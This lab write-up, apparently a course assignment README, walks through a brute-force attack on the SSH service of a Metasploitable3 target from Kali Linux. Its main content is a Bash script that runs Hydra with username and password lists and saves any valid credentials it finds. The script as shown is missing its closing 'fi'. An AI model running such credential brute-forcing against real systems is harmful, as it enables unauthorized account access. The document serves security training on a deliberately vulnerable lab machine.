# Task 1.2 – Compromise the service using a custom script that you create

## 🎯 Objective

Use a custom Bash script with Hydra to perform a brute-force attack on the SSH service of Metasploitable3. 

---

## 🖥️ Environment Setup

| Machine            | IP Address      | Role         |
|--------------------|------------------|--------------|
| Kali Linux         | 192.168.64.2       | Attacker     |
| Metasploitable3    | 192.168.64.3       | Victim       |

---

## 🛠 Tools Used

- **Kali Linux** – Attack platform
- **Metasploit Framework** – Exploitation tool
- **Metasploitable3** – Vulnerable target machine

---

# 🔧 Steps Performed

## ✅ Step 1: Create the Script File Using nano

Open a terminal in Kali and create a new Bash script file:

```bash
nano script.sh
```
![image](https://github.com/user-attachments/assets/457ebecb-f8ea-4e37-bcc5-ff067feacd5d)

## 📄 Script Used

We created a Bash script (`script.sh`) that automates the process of using Hydra to brute-force SSH login credentials.

### 📝 `script.sh`

```bash
#!/bin/bash

# Define the target IP address and port
TARGET_IP="192.168.64.3"      # target IP
TARGET_PORT=22                # target port

# Define the path to the username and password files
USER_LIST="ssh-brute/users.txt"
PASSWORD_LIST="ssh-brute/pass.txt"

# Output file to store valid credentials
OUTPUT_FILE="valid_credentials.txt"

# Check if Hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it and try again."
    exit 1
fi

# Run Hydra to brute-force SSH credentials
echo "Starting brute force attack with Hydra..."
hydra -L "$USER_LIST" -P "$PASSWORD_LIST" ssh://$TARGET_IP -s $TARGET_PORT -o $OUTPUT_FILE

# Check if valid credentials were found
if [ -s "$OUTPUT_FILE" ]; then
    echo "Brute force attack completed. Valid credentials found:"
    cat "$OUTPUT_FILE"
else
    echo "No valid credentials found."
```
![image](https://github.com/user-attachments/assets/201c0d13-45d2-4612-a4bb-b8a5984c7628)

---
### ✅ Step 2: Run the Script Using `bash`

After writing and saving the script using `nano`, we executed it using the following command:

```bash
bash script.sh
```
![image](https://github.com/user-attachments/assets/f0ef2d51-b9c8-4000-8c67-e19fa192ddfb)


